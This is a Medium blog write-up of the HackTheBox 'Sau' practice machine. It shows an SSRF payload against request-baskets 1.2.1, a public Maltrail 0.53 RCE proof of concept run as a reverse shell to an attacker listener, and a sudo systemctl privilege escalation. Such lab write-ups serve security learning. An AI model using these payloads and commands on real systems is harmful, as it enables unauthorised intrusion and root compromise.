> medium-to-markdown@0.0.3 convert
> node index.js https://medium.com/@ahmedgomaa_45441/hackthebox-write-up-sau-machine-438bc39be33f

HackTheBox write up: “Sau” Machine
==================================

![](https://miro.medium.com/v2/resize:fill:88:88/0*g5iT_mFvpwS_KFyc)

(https://medium.com/@ahmedgomaa_45441?source=post_page-----438bc39be33f--------------------------------)

[zerosandones](https://medium.com/@ahmedgomaa_45441?source=post_page-----438bc39be33f--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fa3f1b2b68ccf&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ahmedgomaa_45441%2Fhackthebox-write-up-sau-machine-438bc39be33f&user=zerosandones&userId=a3f1b2b68ccf&source=post_page-a3f1b2b68ccf----438bc39be33f---------------------post_header-----------)

5 min read·2 days ago


Welcome to my first write up for Hackthebox machines!

i thought it would be a good way to help me understand the topics little bit deeper, as i am trying to explain them to others, as well as maybe help others, and share my thought process, breaking into the machine.

![pic](https://miro.medium.com/v2/resize:fit:550/format:webp/1*OSckDAMfASUW56DpVUAr8w.png  " Sau Machine ( Easy )")


Sau machine is your typical Easy linux machine, pretty straight forward in most parts, only one trick in obtaining user flag, and the privilege escalation is a straightforward one ( i spent 40 minutes on it, i might be a little bit stupid ngl ).

Okay, we start as we always do, with basic Nmap scan to the target, and see what do we have here,

![pic](https://miro.medium.com/v2/resize:fit:640/format:webp/1*zXq9MMkP0_eMZfxkTcHn2Q.png)

nmap -sV -sC 10.10.11.224 -v



We are using -sV and -sC here for probing the open ports and trying to get info about the version running by running it against default nmap scripts, the -v for verbose results showing, so we get an idea what is going in, while the scan is undergoing.

nmap scan results

![pic](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*12PAu2RijS_6-IdBXiqXLA.png)


We can already see here couple of intresting information, the most eye-catching the open port 55555, which we can see from the results runs some sort of a webpage, lets try to visit it and see whats going on!



![Web interface](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*--XGicxW2ksrNoC19GN4nA.png)


We are greeted with a web interface, that seems to make some sort of baskets, lets try all the functionalities to try to poke around and get a better idea of what does this application does.

![](https://miro.medium.com/v2/resize:fit:786/format:webp/1*VbgzdLUJz2aexI4AZF1PEg.png)


Created a bucket, and recieved respones

We can see here we created a bucket name “lol”, and it gives us an api url “[http://10.10.11.224:55555/lol](http://10.10.11.224:55555/lol)”, where if we send web requests to it, we can log the requests and the respone in the web interface, a simple get request with curl would be with command:

![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*_RNChTUNc7Ls-War1lTmcg.png)


```
curl "http:10.10.11.224:55555/lol" 
```

Now if we take a look at the other fucntionalites provided, we can see in the settings, and option thats called: “Forward URL”

![](https://miro.medium.com/v2/resize:fit:786/format:webp/1*lFzQY3Mc_EfadmPL7IqjqA.png)


Forward URL? like can i send a request and the server forwards it? to anywhere? can it hit home? 127.0.0.1 kind of home? okay huge potential!

looking around in the other website pages and functionalities, i can help but see a footer that mentions the library used and its version, “request-baskets, version 1.2.1”

![](https://miro.medium.com/v2/resize:fit:612/format:webp/1*vSB1Hv5E65XO6DtPfARVEA.png)


okay, thanks for the doing th hardwork, lets see if we can find and public vulnerabilites regarding the version of the software

![](https://miro.medium.com/v2/resize:fit:786/format:webp/1*Z2BRv6Dx2-fWj-ub1x23Ag.png)

yeah, i think we pretty much found what are we searching for! ssrf vulnerable library, hehe

using assist from the detailed thread about the SSRF : [https://notes.sjtu.edu.cn/s/MUUhEymt7](https://notes.sjtu.edu.cn/s/MUUhEymt7#)

we see that the api /api/baskets/{name} is vulnerable,

and using the crafted payload to send a post request, that redirects to home(127.0.0.1) and sending it using postman

![](https://miro.medium.com/v2/resize:fit:786/format:webp/1*zFCktzlRu2wSY_hJBf507w.png)

```
{  
  "forward\_url": "http://127.0.0.1:80/test",  
  "proxy\_response": false,  
  "insecure\_tls": false,  
  "expand\_path": true,  
  "capacity": 250  
}
```

we can see, we have accessed internal page, in the footer of this page, we can notice the library and version, “Maltrail V0.53”.

Again, we lookup to see if there are any public CVEs related to it

![](https://miro.medium.com/v2/resize:fit:786/format:webp/1*DsFLJ2vLWOuyX8vFkPYoCw.png)


we can see there is an RCE exploit available, with POC, lets download this POC from github and see if we can run it!

now if we look at the exploit documentation, we can see the arguments it takes to run it

```
python3 exploit.py \[listening\_IP\] \[listening\_PORT\] \[target\_URL\]
```

in this case, we have

```
python3 exploit.py 10.10.16.7 4444 http://10.10.11.224:55555/lol
```

But before we run it, we need to have a listener running to catch the connection,( Since its a reverse shell, not bind )

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*UlDOL2EKC_lYNCeIOIMN6g.png)

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tJiwKGcndwkcjWVQpu834Q.png)


And after running the exploit, we can see, we have got our reverse shell successfully!

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*mA3JeHlEP_YuDPnRKvO7yQ.png)


we can then get our flag which is in the home/puma/flag.txt directory.

— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

Now, we have the user flag, but in order to obtian the root flag, we need to escalate our privilges into root, there are multiple ways we can try to escalate our privilegs through, either with LinEnum or linPeas,

but like to first check manually if we can abuse any GTFObins that can give us root permissions, since its fast and easy step,

we can first start checking by running “sudo -l” to see what can run with sudo without the root password

![](https://miro.medium.com/v2/resize:fit:786/format:webp/1*jz1XkSxq20DL371fDqwr3Q.png)


we can see we can run systemctl with root without the root password, but can we maybe abuse it to give it root permissions? lets check if it is in the GTFObins…

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*YkG-ou08zpsVQwFnbE0-sA.png)


yessir! that means we can use it to escalate our priviliges, we can scroll down to see how exactly,

![](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Ctis-Jvt78tFai-8bOzHTw.png)


Lets try ( C ) and see if it works,

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*woXC-9knl1Kl7Wwu2F45EQ.png)


yessir!

we can find root flag under /flag.txt!

i hope it was helpful!

see you next time!

![](https://miro.medium.com/v2/resize:fit:640/0*gCkCaZMd6bc7fUA3.gif)


